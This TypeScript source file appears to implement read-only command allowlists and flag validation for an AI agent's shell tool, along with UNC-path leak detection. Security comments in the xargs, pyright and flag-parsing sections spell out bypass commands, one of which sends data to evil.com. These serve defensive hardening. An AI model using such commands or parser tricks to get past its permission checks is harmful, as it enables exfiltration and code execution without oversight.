						token[0] === "-" &&
						token[1] !== "-" &&
						token.length > 2 &&
						!token.includes("=") &&
						token.slice(1).includes("l")
					) {
						seenListFlag = true
					}
					if (token.includes("=")) {
						lastFlag = token.split("=")[0] || ""
						i++
					} else if (flagsWithArgs.has(token)) {
						lastFlag = token
						i += 2
					} else {
						lastFlag = token
						i++
					}
				} else {
					// Non-flag argument (or post-`--` positional) - could be:
					// 1. A branch name (dangerous - creates a branch)
					// 2. A pattern after --list/-l (safe)
					// 3. An optional argument after --merged/--no-merged (safe)
					const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag)
					if (!seenListFlag && !lastFlagHasOptionalArg) {
						return true // Positional arg without --list or filtering flag = branch creation
					}
					i++
				}
			}
			return false
		},
	},
}

// ---------------------------------------------------------------------------
// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs read-only commands
// ---------------------------------------------------------------------------

export const DOCKER_READ_ONLY_COMMANDS: Record<string, CommandConfig> = {
	"docker logs": {
		safeFlags: {
			"--follow": "none",
			"-f": "none",
			"--tail": "string",
			"-n": "string",
			"--timestamps": "none",
			"-t": "none",
			"--since": "string",
			"--until": "string",
			"--details": "none",
		},
	},
	"docker inspect": {
		safeFlags: {
			"--format": "string",
			"-f": "string",
			"--type": "string",
			"--size": "none",
			"-s": "none",
		},
	},
}

// ---------------------------------------------------------------------------
// RIPGREP_READ_ONLY_COMMANDS — rg (ripgrep) read-only search
// ---------------------------------------------------------------------------

export const RIPGREP_READ_ONLY_COMMANDS: Record<string, CommandConfig> = {
	rg: {
		safeFlags: {
			// Pattern flags
			"-e": "string", // Pattern to search for
			"--regexp": "string",
			"-f": "string", // Read patterns from file

			// Common search options
			"-i": "none", // Case insensitive
			"--ignore-case": "none",
			"-S": "none", // Smart case
			"--smart-case": "none",
			"-F": "none", // Fixed strings
			"--fixed-strings": "none",
			"-w": "none", // Word regexp
			"--word-regexp": "none",
			"-v": "none", // Invert match
			"--invert-match": "none",

			// Output options
			"-c": "none", // Count matches
			"--count": "none",
			"-l": "none", // Files with matches
			"--files-with-matches": "none",
			"--files-without-match": "none",
			"-n": "none", // Line number
			"--line-number": "none",
			"-o": "none", // Only matching
			"--only-matching": "none",
			"-A": "number", // After context
			"--after-context": "number",
			"-B": "number", // Before context
			"--before-context": "number",
			"-C": "number", // Context
			"--context": "number",
			"-H": "none", // With filename
			"-h": "none", // No filename
			"--heading": "none",
			"--no-heading": "none",
			"-q": "none", // Quiet
			"--quiet": "none",
			"--column": "none",

			// File filtering
			"-g": "string", // Glob
			"--glob": "string",
			"-t": "string", // Type
			"--type": "string",
			"-T": "string", // Type not
			"--type-not": "string",
			"--type-list": "none",
			"--hidden": "none",
			"--no-ignore": "none",
			"-u": "none", // Unrestricted

			// Common options
			"-m": "number", // Max count per file
			"--max-count": "number",
			"-d": "number", // Max depth
			"--max-depth": "number",
			"-a": "none", // Text (search binary files)
			"--text": "none",
			"-z": "none", // Search zip
			"-L": "none", // Follow symlinks
			"--follow": "none",

			// Display options
			"--color": "string",
			"--json": "none",
			"--stats": "none",

			// Help and version
			"--help": "none",
			"--version": "none",
			"--debug": "none",

			// Special argument separator
			"--": "none",
		},
	},
}

// ---------------------------------------------------------------------------
// PYRIGHT_READ_ONLY_COMMANDS — pyright static type checker
// ---------------------------------------------------------------------------

export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, CommandConfig> = {
	pyright: {
		respectsDoubleDash: false, // pyright treats -- as a file path, not end-of-options
		safeFlags: {
			"--outputjson": "none",
			"--project": "string",
			"-p": "string",
			"--pythonversion": "string",
			"--pythonplatform": "string",
			"--typeshedpath": "string",
			"--venvpath": "string",
			"--level": "string",
			"--stats": "none",
			"--verbose": "none",
			"--version": "none",
			"--dependencies": "none",
			"--warnings": "none",
		},
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Check if --watch or -w appears as a standalone token (flag)
			return args.some(t => t === "--watch" || t === "-w")
		},
	},
}

// ---------------------------------------------------------------------------
// EXTERNAL_READONLY_COMMANDS — cross-shell read-only commands
// ---------------------------------------------------------------------------

export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
	// Cross-platform external tools that work the same in bash and PowerShell on Windows
	"docker ps",
	"docker images",
]

// ---------------------------------------------------------------------------
// UNC path detection (Windows-only — gated off on other platforms)
// ---------------------------------------------------------------------------

// Windows-only. omp ports skip Windows-only branches per the port spec.
const IS_WINDOWS = false;

/**
 * Check if a path or command contains a UNC path that could trigger network
 * requests (NTLM/Kerberos credential leakage, WebDAV attacks).
 *
 * This function detects:
 * - Basic UNC paths: \\server\share, \\foo.com\file
 * - WebDAV patterns: \\server@SSL@8443\, \\server@8443@SSL\, \\server\DavWWWRoot\
 * - IP-based UNC: \\192.168.1.1\share, \\[2001:db8::1]\share
 * - Forward-slash variants: //server/share
 */
export function containsVulnerableUncPath(pathOrCommand: string): boolean {
	// Only check on Windows platform (Windows-only branch — always false in omp)
	if (!IS_WINDOWS) {
		return false
	}

	// 1. Check for general UNC paths with backslashes
	// Pattern matches: \\server, \\server\share, \\server/share, \\server@port\share
	// Uses [^\s\\/]+ for hostname to catch Unicode homoglyphs and other non-ASCII chars
	// Trailing accepts both \ and / since Windows treats both as path separators
	const backslashUncPattern = /\\\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
	if (backslashUncPattern.test(pathOrCommand)) {
		return true
	}

	// 2. Check for forward-slash UNC paths
	// Pattern matches: //server, //server/share, //server\share, //192.168.1.1/share
	// Uses negative lookbehind (?<!:) to exclude URLs (https://, http://, ftp://)
	// while catching // preceded by quotes, =, or any other non-colon character.
	const forwardSlashUncPattern = /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
	if (forwardSlashUncPattern.test(pathOrCommand)) {
		return true
	}

	// 3. Check for mixed-separator UNC paths (forward slash + backslashes)
	// On Windows/Cygwin, /\ is equivalent to // since both are path separators.
	// Requires 2+ backslashes after / because a single backslash just escapes the next char.
	const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/
	if (mixedSlashUncPattern.test(pathOrCommand)) {
		return true
	}

	// 4. Check for mixed-separator UNC paths (backslashes + forward slash)
	const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/
	if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
		return true
	}

	// 5. Check for WebDAV SSL/port patterns
	// Examples: \\server@SSL@8443\path, \\server@8443@SSL\path
	if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
		return true
	}

	// 6. Check for DavWWWRoot marker (Windows WebDAV redirector)
	// Example: \\server\DavWWWRoot\path
	if (/DavWWWRoot/i.test(pathOrCommand)) {
		return true
	}

	// 7. Check for UNC paths with IPv4 addresses (explicit check for defense-in-depth)
	if (
		/^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
		/^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)
	) {
		return true
	}

	// 8. Check for UNC paths with bracketed IPv6 addresses (explicit check for defense-in-depth)
	if (
		/^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
		/^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)
	) {
		return true
	}

	return false
}

// ---------------------------------------------------------------------------
// Flag validation utilities
// ---------------------------------------------------------------------------

// Regex pattern to match valid flag names (letters, digits, underscores, hyphens)
export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/

/**
 * Validates flag arguments based on their expected type
 */
export function validateFlagArgument(value: string, argType: FlagArgType): boolean {
	switch (argType) {
		case "none":
			return false // Should not have been called for 'none' type
		case "number":
			return /^\d+$/.test(value)
		case "string":
			return true // Any string including empty is valid
		case "char":
			return value.length === 1
		case "{}":
			return value === "{}"
		case "EOF":
			return value === "EOF"
		default:
			return false
	}
}

/**
 * Validates the flags/arguments portion of a tokenized command against a config.
 * This is the flag-walking loop extracted from BashTool's isCommandSafeViaFlagParsing.
 *
 * @param tokens - Pre-tokenized args (from the shell tokenizer)
 * @param startIndex - Where to start validating (after command tokens)
 * @param config - The safe flags config
 * @param options.commandName - For command-specific handling (git numeric shorthand, grep/rg attached numeric)
 * @param options.rawCommand - For additionalCommandIsDangerousCallback
 * @param options.xargsTargetCommands - If provided, enables xargs-style target command detection
 * @returns true if all flags are valid, false otherwise
 */
export function validateFlags(
	tokens: string[],
	startIndex: number,
	config: CommandConfig,
	options?: {
		commandName?: string
		rawCommand?: string
		xargsTargetCommands?: string[]
	},
): boolean {
	let i = startIndex

	while (i < tokens.length) {
		let token = tokens[i]
		if (!token) {
			i++
			continue
		}

		// Special handling for xargs: once we find the target command, stop validating flags
		if (
			options?.xargsTargetCommands &&
			options.commandName === "xargs" &&
			(!token.startsWith("-") || token === "--")
		) {
			if (token === "--" && i + 1 < tokens.length) {
				i++
				token = tokens[i]
			}
			if (token && options.xargsTargetCommands.includes(token)) {
				break
			}
			return false
		}

		if (token === "--") {
			// SECURITY: Only break if the tool respects POSIX `--` (default: true).
			// Tools like pyright don't respect `--` — they treat it as a file path
			// and continue processing subsequent tokens as flags. Breaking here
			// would let `pyright -- --createstub os` auto-approve a file-write flag.
			if (config.respectsDoubleDash !== false) {
				i++
				break // Everything after -- is arguments
			}
			// Tool doesn't respect --: treat as positional arg, keep validating
			i++
			continue
		}

		if (token.startsWith("-") && token.length > 1 && FLAG_PATTERN.test(token)) {
			// Handle --flag=value format
			// SECURITY: Track whether the token CONTAINS `=` separately from
			// whether the value is non-empty. `-E=` has `hasEquals=true` but
			// `inlineValue=''` (falsy). Without `hasEquals`, the falsy check
			// would fall through to "consume next token" — but GNU getopt for
			// short options with mandatory arg sees `-E=` as `-E` with ATTACHED
			// arg `=` (it doesn't strip `=` for short options). Parser
			// differential: validator advances 2 tokens, GNU advances 1.
			//
			// Attack: `xargs -E= EOF echo foo` (zero permissions)
			//   Validator: inlineValue='' falsy → consumes EOF as -E arg → i+=2 →
			//     echo ∈ SAFE_TARGET → break → AUTO-ALLOWED
			//   GNU xargs: -E attached arg=`=` → EOF is TARGET COMMAND → CODE EXEC
			//
			// Fix: when hasEquals is true, use inlineValue (even if empty) as the
			// provided arg. validateFlagArgument('', 'EOF') → false → rejected.
			const hasEquals = token.includes("=")
			const [flag, ...valueParts] = token.split("=")
			const inlineValue = valueParts.join("=")

			if (!flag) {
				return false
			}

			const flagArgType = config.safeFlags[flag]

			if (!flagArgType) {
				// Special case: git commands support -<number> as shorthand for -n <number>
				if (options?.commandName === "git" && flag.match(/^-\d+$/)) {
					// This is equivalent to -n flag which is safe for git log/diff/show
					i++
					continue
				}

				// Handle flags with directly attached numeric arguments (e.g., -A20, -B10)
				// Only apply this special handling to grep and rg commands
				if (
					(options?.commandName === "grep" || options?.commandName === "rg") &&
					flag.startsWith("-") &&
					!flag.startsWith("--") &&
					flag.length > 2
				) {
					const potentialFlag = flag.substring(0, 2) // e.g., '-A' from '-A20'
					const potentialValue = flag.substring(2) // e.g., '20' from '-A20'

					if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
						// This is a flag with attached numeric argument
						const potentialFlagArgType = config.safeFlags[potentialFlag]
						if (potentialFlagArgType === "number" || potentialFlagArgType === "string") {
							// Validate the numeric value
							if (validateFlagArgument(potentialValue, potentialFlagArgType)) {
								i++
								continue
							} else {
								return false // Invalid attached value
							}
						}
					}
				}

				// Handle combined single-letter flags like -nr
				// SECURITY: We must NOT allow any bundled flag that takes an argument.
				// GNU getopt bundling semantics: when an arg-taking option appears LAST
				// in a bundle with no trailing chars, the NEXT argv element is consumed
				// as its argument. So `xargs -rI echo sh -c id` is parsed by xargs as:
				//   -r (no-arg) + -I with replace-str=`echo`, target=`sh -c id`
				// Our naive handler previously only checked EXISTENCE in safeFlags (both
				// `-r: 'none'` and `-I: '{}'` are truthy), then `i++` consumed ONE token.
				// This created a parser differential: our validator thought `echo` was
				// the xargs target (in SAFE_TARGET_COMMANDS_FOR_XARGS → break), but
				// xargs ran `sh -c id`. ARBITRARY RCE with only Bash(echo:*) or less.
				//
				// Fix: require ALL bundled flags to have arg type 'none'. If any bundled
				// flag requires an argument (non-'none' type), reject the whole bundle.
				// This is conservative — it blocks `-rI` (xargs) entirely, but that's
				// the safe direction. Users who need `-I` can use it unbundled: `-r -I {}`.
				if (flag.startsWith("-") && !flag.startsWith("--") && flag.length > 2) {
					for (let j = 1; j < flag.length; j++) {
						const singleFlag = "-" + flag[j]
						const flagType = config.safeFlags[singleFlag]
						if (!flagType) {
							return false // One of the combined flags is not safe
						}
						// SECURITY: Bundled flags must be no-arg type. An arg-taking flag
						// in a bundle consumes the NEXT token in GNU getopt, which our
						// handler doesn't model. Reject to avoid parser differential.
						if (flagType !== "none") {
							return false // Arg-taking flag in a bundle — cannot safely validate
						}
					}
					i++
					continue
				} else {
					return false // Unknown flag
				}
			}

			// Validate flag arguments
			if (flagArgType === "none") {
				// SECURITY: hasEquals covers `-FLAG=` (empty inline). Without it,
				// `-FLAG=` with 'none' type would pass (inlineValue='' is falsy).
				if (hasEquals) {
					return false // Flag should not have a value
				}
				i++
			} else {
				let argValue: string
				// SECURITY: Use hasEquals (not inlineValue truthiness). `-E=` must
				// NOT consume next token — the user explicitly provided empty value.
				if (hasEquals) {
					argValue = inlineValue
					i++
				} else {
					// Check if next token is the argument
					if (
						i + 1 >= tokens.length ||
						(tokens[i + 1] &&
							tokens[i + 1]!.startsWith("-") &&
							tokens[i + 1]!.length > 1 &&
							FLAG_PATTERN.test(tokens[i + 1]!))
					) {
						return false // Missing required argument
					}
					argValue = tokens[i + 1] || ""
					i += 2
				}

				// Defense-in-depth: For string arguments, reject values that start with '-'
				// This prevents type confusion attacks where a flag marked as 'string'
				// but actually takes no arguments could be used to inject dangerous flags
				// Exception: git's --sort flag can have values starting with '-' for reverse sorting
				if (flagArgType === "string" && argValue.startsWith("-")) {
					// Special case: git's --sort flag allows - prefix for reverse sorting
					if (
						flag === "--sort" &&
						options?.commandName === "git" &&
						argValue.match(/^-[a-zA-Z]/)
					) {
						// This looks like a reverse sort (e.g., -refname, -version:refname)
						// Allow it if the rest looks like a valid sort key
					} else {
						return false
					}
				}

				// Validate argument based on type
				if (!validateFlagArgument(argValue, flagArgType)) {
					return false
				}
			}
		} else {
			// Non-flag argument (like revision specs, file paths, etc.) - this is allowed
			i++
		}
	}

	return true
}

// ---------------------------------------------------------------------------
// Central configuration for allowlist-based command validation
// All commands and flags here should only allow reading files. They should not
// allow writing to files, executing code, or creating network requests.
// ---------------------------------------------------------------------------

// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
// they execute arbitrary commands for each search result.
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
	"-h": "none",
	"--help": "none",
	"-V": "none",
	"--version": "none",
	"-H": "none",
	"--hidden": "none",
	"-I": "none",
	"--no-ignore": "none",
	"--no-ignore-vcs": "none",
	"--no-ignore-parent": "none",
	"-s": "none",
	"--case-sensitive": "none",
	"-i": "none",
	"--ignore-case": "none",
	"-g": "none",
	"--glob": "none",
	"--regex": "none",
	"-F": "none",
	"--fixed-strings": "none",
	"-a": "none",
	"--absolute-path": "none",
	// SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
	// pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
	"-L": "none",
	"--follow": "none",
	"-p": "none",
	"--full-path": "none",
	"-0": "none",
	"--print0": "none",
	"-d": "number",
	"--max-depth": "number",
	"--min-depth": "number",
	"--exact-depth": "number",
	"-t": "string",
	"--type": "string",
	"-e": "string",
	"--extension": "string",
	"-S": "string",
	"--size": "string",
	"--changed-within": "string",
	"--changed-before": "string",
	"-o": "string",
	"--owner": "string",
	"-E": "string",
	"--exclude": "string",
	"--ignore-file": "string",
	"-c": "string",
	"--color": "string",
	"-j": "number",
	"--threads": "number",
	"--max-buffer-time": "string",
	"--max-results": "number",
	"-1": "none",
	"-q": "none",
	"--quiet": "none",
	"--show-errors": "none",
	"--strip-cwd-prefix": "none",
	"--one-file-system": "none",
	"--prune": "none",
	"--search-path": "string",
	"--base-directory": "string",
	"--path-separator": "string",
	"--batch-size": "number",
	"--no-require-git": "none",
	"--hyperlink": "string",
	"--and": "string",
	"--format": "string",
}

const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
	xargs: {
		safeFlags: {
			"-I": "{}",
			// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
			// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
			// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
			// flag takes NO arg and `X` becomes the next positional (target command).
			//
			// `-i` (`i::` — optional replace-str):
			//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
			//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
			//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
			//
			// `-e` (`e::` — optional eof-str):
			//   cat data | xargs -e EOF echo foo
			//   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
			//   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
			//   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
			//
			// Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
			// arg) instead — both validator and xargs agree on argument consumption.
			// `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
			"-n": "number",
			"-P": "number",
			"-L": "number",
			"-s": "number",
			"-E": "EOF", // POSIX, MANDATORY separate arg — validator & xargs agree
			"-0": "none",
			"-t": "none",
			"-r": "none",
			"-x": "none",
			"-d": "char",
		},
	},
	// All git read-only commands from shared validation map
	...GIT_READ_ONLY_COMMANDS,
	file: {
		safeFlags: {
			// Output format flags
			"--brief": "none",
			"-b": "none",
			"--mime": "none",
			"-i": "none",
			"--mime-type": "none",
			"--mime-encoding": "none",
			"--apple": "none",
			// Behavior flags
			"--check-encoding": "none",
			"-c": "none",
			"--exclude": "string",
			"--exclude-quiet": "string",
			"--print0": "none",
			"-0": "none",
			"-f": "string",
			"-F": "string",
			"--separator": "string",
			"--help": "none",
			"--version": "none",
			"-v": "none",
			// Following/dereferencing
			"--no-dereference": "none",
			"-h": "none",
			"--dereference": "none",
			"-L": "none",
			// Magic file options (safe when just reading)
			"--magic-file": "string",
			"-m": "string",
			// Other safe options
			"--keep-going": "none",
			"-k": "none",
			"--list": "none",
			"-l": "none",
			"--no-buffer": "none",
			"-n": "none",
			"--preserve-date": "none",
			"-p": "none",
			"--raw": "none",
			"-r": "none",
			"-s": "none",
			"--special-files": "none",
			// Uncompress flag for archives
			"--uncompress": "none",
			"-z": "none",
		},
	},
	sed: {
		safeFlags: {
			// Expression flags
			"--expression": "string",
			"-e": "string",
			// Output control
			"--quiet": "none",
			"--silent": "none",
			"-n": "none",
			// Extended regex
			"--regexp-extended": "none",
			"-r": "none",
			"--posix": "none",
			"-E": "none",
			// Line handling
			"--line-length": "number",
			"-l": "number",
			"--zero-terminated": "none",
			"-z": "none",
			"--separate": "none",
			"-s": "none",
			"--unbuffered": "none",
			"-u": "none",
			// Debugging/help
			"--debug": "none",
			"--help": "none",
			"--version": "none",
		},
		// PORT DEVIATION: the source gates sed via sedCommandIsAllowedByAllowlist
		// (sedValidation.ts, ~687 lines of script parsing). That module was not
		// ported, so every sed command is conservatively treated as dangerous —
		// sed commands never qualify as read-only.
		additionalCommandIsDangerousCallback: () => true,
	},
	sort: {
		safeFlags: {
			// Sorting options
			"--ignore-leading-blanks": "none",
			"-b": "none",
			"--dictionary-order": "none",
			"-d": "none",
			"--ignore-case": "none",
			"-f": "none",
			"--general-numeric-sort": "none",
			"-g": "none",
			"--human-numeric-sort": "none",
			"-h": "none",
			"--ignore-nonprinting": "none",
			"-i": "none",
			"--month-sort": "none",
			"-M": "none",
			"--numeric-sort": "none",
			"-n": "none",
			"--random-sort": "none",
			"-R": "none",
			"--reverse": "none",
			"-r": "none",
			"--sort": "string",
			"--stable": "none",
			"-s": "none",
			"--unique": "none",
			"-u": "none",
			"--version-sort": "none",
			"-V": "none",
			"--zero-terminated": "none",
			"-z": "none",
			// Key specifications
			"--key": "string",
			"-k": "string",
			"--field-separator": "string",
			"-t": "string",
			// Checking
			"--check": "none",
			"-c": "none",
			"--check-char-order": "none",
			"-C": "none",
			// Merging
			"--merge": "none",
			"-m": "none",
			// Buffer size
			"--buffer-size": "string",
			"-S": "string",
			// Parallel processing
			"--parallel": "number",
			// Batch size
			"--batch-size": "number",
			// Help and version
			"--help": "none",
			"--version": "none",
		},
	},
	man: {
		safeFlags: {
			// Safe display options
			"-a": "none", // Display all manual pages
			"--all": "none", // Same as -a
			"-d": "none", // Debug mode
			"-f": "none", // Emulate whatis
			"--whatis": "none", // Same as -f
			"-h": "none", // Help
			"-k": "none", // Emulate apropos
			"--apropos": "none", // Same as -k
			"-l": "string", // Local file (safe for reading, Linux only)
			"-w": "none", // Display location instead of content

			// Safe formatting options
			"-S": "string", // Restrict manual sections
			"-s": "string", // Same as -S for whatis/apropos mode
		},
	},
	// help command - only allow bash builtin help flags to prevent attacks when
	// help is aliased to man (e.g., in oh-my-zsh common-aliases plugin).
	// man's -P flag allows arbitrary command execution via pager.
	help: {
		safeFlags: {
			"-d": "none", // Output short description for each topic
			"-m": "none", // Display usage in pseudo-manpage format
			"-s": "none", // Output only a short usage synopsis
		},
	},
	netstat: {
		safeFlags: {
			// Safe display options
			"-a": "none", // Show all sockets
			"-L": "none", // Show listen queue sizes
			"-l": "none", // Print full IPv6 address
			"-n": "none", // Show network addresses as numbers

			// Safe filtering options
			"-f": "string", // Address family (inet, inet6, unix, vsock)

			// Safe interface options
			"-g": "none", // Show multicast group membership
			"-i": "none", // Show interface state
			"-I": "string", // Specific interface

			// Safe statistics options
			"-s": "none", // Show per-protocol statistics

			// Safe routing options
			"-r": "none", // Show routing tables

			// Safe mbuf options
			"-m": "none", // Show memory management statistics

			// Safe other options
			"-v": "none", // Increase verbosity
		},
	},
	ps: {
		safeFlags: {
			// UNIX-style process selection (these are safe)
			"-e": "none", // Select all processes
			"-A": "none", // Select all processes (same as -e)
			"-a": "none", // Select all with tty except session leaders
			"-d": "none", // Select all except session leaders
			"-N": "none", // Negate selection
			"--deselect": "none",

			// UNIX-style output format (safe, doesn't show env)
			"-f": "none", // Full format
			"-F": "none", // Extra full format
			"-l": "none", // Long format
			"-j": "none", // Jobs format
			"-y": "none", // Don't show flags

			// Output modifiers (safe ones)
			"-w": "none", // Wide output
			"-ww": "none", // Unlimited width
			"--width": "number",
			"-c": "none", // Show scheduler info
			"-H": "none", // Show process hierarchy
			"--forest": "none",
			"--headers": "none",
			"--no-headers": "none",
			"-n": "string", // Set namelist file
			"--sort": "string",

			// Thread display
			"-L": "none", // Show threads
			"-T": "none", // Show threads
			"-m": "none", // Show threads after processes

			// Process selection by criteria
			"-C": "string", // By command name
			"-G": "string", // By real group ID
			"-g": "string", // By session or effective group
			"-p": "string", // By PID
			"--pid": "string",
			"-q": "string", // Quick mode by PID
			"--quick-pid": "string",
			"-s": "string", // By session ID
			"--sid": "string",
			"-t": "string", // By tty
			"--tty": "string",
			"-U": "string", // By real user ID
			"-u": "string", // By effective user ID
			"--user": "string",

			// Help/version
			"--help": "none",
			"--info": "none",
			"-V": "none",
			"--version": "none",
		},
		// Block BSD-style 'e' modifier which shows environment variables
		// BSD options are letter-only tokens without a leading dash
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Check for BSD-style 'e' in letter-only tokens (not -e which is UNIX-style)
			// A BSD-style option is a token of only letters (no leading dash) containing 'e'
			return args.some(a => !a.startsWith("-") && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a))
		},
	},
	base64: {
		respectsDoubleDash: false, // macOS base64 does not respect POSIX --
		safeFlags: {
			// Safe decode options
			"-d": "none", // Decode
			"-D": "none", // Decode (macOS)
			"--decode": "none", // Decode

			// Safe formatting options
			"-b": "number", // Break lines at num (macOS)
			"--break": "number", // Break lines at num (macOS)
			"-w": "number", // Wrap lines at COLS (Linux)
			"--wrap": "number", // Wrap lines at COLS (Linux)

			// Safe input options (read from file, not write)
			"-i": "string", // Input file (safe for reading)
			"--input": "string", // Input file (safe for reading)

			// Safe misc options
			"--ignore-garbage": "none", // Ignore non-alphabet chars when decoding (Linux)
			"-h": "none", // Help
			"--help": "none", // Help
			"--version": "none", // Version
		},
	},
	grep: {
		safeFlags: {
			// Pattern flags
			"-e": "string", // Pattern
			"--regexp": "string",
			"-f": "string", // File with patterns
			"--file": "string",
			"-F": "none", // Fixed strings
			"--fixed-strings": "none",
			"-G": "none", // Basic regexp (default)
			"--basic-regexp": "none",
			"-E": "none", // Extended regexp
			"--extended-regexp": "none",
			"-P": "none", // Perl regexp
			"--perl-regexp": "none",

			// Matching control
			"-i": "none", // Ignore case
			"--ignore-case": "none",
			"--no-ignore-case": "none",
			"-v": "none", // Invert match
			"--invert-match": "none",
			"-w": "none", // Word regexp
			"--word-regexp": "none",
			"-x": "none", // Line regexp
			"--line-regexp": "none",

			// Output control
			"-c": "none", // Count
			"--count": "none",
			"--color": "string",
			"--colour": "string",
			"-L": "none", // Files without match
			"--files-without-match": "none",
			"-l": "none", // Files with matches
			"--files-with-matches": "none",
			"-m": "number", // Max count
			"--max-count": "number",
			"-o": "none", // Only matching
			"--only-matching": "none",
			"-q": "none", // Quiet
			"--quiet": "none",
			"--silent": "none",
			"-s": "none", // No messages
			"--no-messages": "none",

			// Output line prefix
			"-b": "none", // Byte offset
			"--byte-offset": "none",
			"-H": "none", // With filename
			"--with-filename": "none",
			"-h": "none", // No filename
			"--no-filename": "none",
			"--label": "string",
			"-n": "none", // Line number
			"--line-number": "none",
			"-T": "none", // Initial tab
			"--initial-tab": "none",
			"-u": "none", // Unix byte offsets
			"--unix-byte-offsets": "none",
			"-Z": "none", // Null after filename
			"--null": "none",
			"-z": "none", // Null data
			"--null-data": "none",

			// Context control
			"-A": "number", // After context
			"--after-context": "number",
			"-B": "number", // Before context
			"--before-context": "number",
			"-C": "number", // Context
			"--context": "number",
			"--group-separator": "string",
			"--no-group-separator": "none",

			// File and directory selection
			"-a": "none", // Text (process binary as text)
			"--text": "none",
			"--binary-files": "string",
			"-D": "string", // Devices
			"--devices": "string",
			"-d": "string", // Directories
			"--directories": "string",
			"--exclude": "string",
			"--exclude-from": "string",
			"--exclude-dir": "string",
			"--include": "string",
			"-r": "none", // Recursive
			"--recursive": "none",
			"-R": "none", // Dereference-recursive
			"--dereference-recursive": "none",

			// Other options
			"--line-buffered": "none",
			"-U": "none", // Binary
			"--binary": "none",

			// Help and version
			"--help": "none",
			"-V": "none",
			"--version": "none",
		},
	},
	...RIPGREP_READ_ONLY_COMMANDS,
	// Checksum commands - these only read files and compute/verify hashes
	// All flags are safe as they only affect output format or verification behavior
	sha256sum: {
		safeFlags: {
			// Mode flags
			"-b": "none", // Binary mode
			"--binary": "none",
			"-t": "none", // Text mode
			"--text": "none",

			// Check/verify flags
			"-c": "none", // Verify checksums from file
			"--check": "none",
			"--ignore-missing": "none", // Ignore missing files during check
			"--quiet": "none", // Quiet mode during check
			"--status": "none", // Don't output, exit code shows success
			"--strict": "none", // Exit non-zero for improperly formatted lines
			"-w": "none", // Warn about improperly formatted lines
			"--warn": "none",

			// Output format flags
			"--tag": "none", // BSD-style output
			"-z": "none", // End output lines with NUL
			"--zero": "none",

			// Help and version
			"--help": "none",
			"--version": "none",
		},
	},
	sha1sum: {
		safeFlags: {
			// Mode flags
			"-b": "none", // Binary mode
			"--binary": "none",
			"-t": "none", // Text mode
			"--text": "none",

			// Check/verify flags
			"-c": "none", // Verify checksums from file
			"--check": "none",
			"--ignore-missing": "none", // Ignore missing files during check
			"--quiet": "none", // Quiet mode during check
			"--status": "none", // Don't output, exit code shows success
			"--strict": "none", // Exit non-zero for improperly formatted lines
			"-w": "none", // Warn about improperly formatted lines
			"--warn": "none",

			// Output format flags
			"--tag": "none", // BSD-style output
			"-z": "none", // End output lines with NUL
			"--zero": "none",

			// Help and version
			"--help": "none",
			"--version": "none",
		},
	},
	md5sum: {
		safeFlags: {
			// Mode flags
			"-b": "none", // Binary mode
			"--binary": "none",
			"-t": "none", // Text mode
			"--text": "none",

			// Check/verify flags
			"-c": "none", // Verify checksums from file
			"--check": "none",
			"--ignore-missing": "none", // Ignore missing files during check
			"--quiet": "none", // Quiet mode during check
			"--status": "none", // Don't output, exit code shows success
			"--strict": "none", // Exit non-zero for improperly formatted lines
			"-w": "none", // Warn about improperly formatted lines
			"--warn": "none",

			// Output format flags
			"--tag": "none", // BSD-style output
			"-z": "none", // End output lines with NUL
			"--zero": "none",

			// Help and version
			"--help": "none",
			"--version": "none",
		},
	},
	// tree command - moved from READONLY_COMMAND_REGEXES to allow flags and path arguments
	// -o/--output writes to a file, so it's excluded. All other flags are display/filter options.
	tree: {
		safeFlags: {
			// Listing options
			"-a": "none", // All files
			"-d": "none", // Directories only
			"-l": "none", // Follow symlinks
			"-f": "none", // Full path prefix
			"-x": "none", // Stay on current filesystem
			"-L": "number", // Max depth
			// SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
			// WRITES 00Tree.html files to every subdirectory at the depth boundary.
			// From man tree (< 2.1.0): "-R — at each of them execute tree again
			// adding `-o 00Tree.html` as a new option." The comment "Rerun at max
			// depth" was misleading — the "rerun" includes a hardcoded -o file write.
